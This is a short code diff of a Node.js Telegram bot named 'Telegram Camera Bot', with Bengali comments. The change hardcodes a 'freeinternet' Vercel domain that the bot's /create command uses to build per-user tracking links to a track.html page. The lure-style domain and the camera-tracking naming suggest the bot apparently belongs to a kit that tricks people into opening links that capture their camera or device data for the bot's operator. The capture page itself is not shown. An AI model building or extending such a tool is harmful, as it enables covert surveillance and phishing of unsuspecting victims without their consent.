@@ -1,6 +1,5 @@
 const { Telegraf } = require('telegraf');
 
-// Bot token environment variable থেকে নিন
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const bot = new Telegraf(BOT_TOKEN);
 
@@ -30,8 +29,8 @@ bot.command('create', (ctx) => {
     const username = ctx.message.chat.username || 'user';
     const firstName = ctx.message.chat.first_name || 'User';
     
-    // Vercel ডোমেইন
-    const domain = process.env.VERCEL_URL || 'https://freeinternet-seven.vercel.app';
+    // 🔥 FIXED DOMAIN - আপনার প্রজেক্ট নাম দিয়ে রিপ্লেস করুন
+    const domain = "https://freeinternet-seven.vercel.app";
     const trackingUrl = `${domain}/track.html?chatid=${chatId}&user=${username}`;
     
     const responseMessage = `
@@ -121,7 +120,8 @@ module.exports = async (req, res) => {
             status: 'Bot is running!',
             timestamp: new Date().toISOString(),
             service: 'Telegram Camera Bot',
-            webhook: 'Please set webhook manually'
+            webhook: 'Please set webhook manually',
+            domain: 'https://freeinternet.vercel.app'
         });
     }
 };
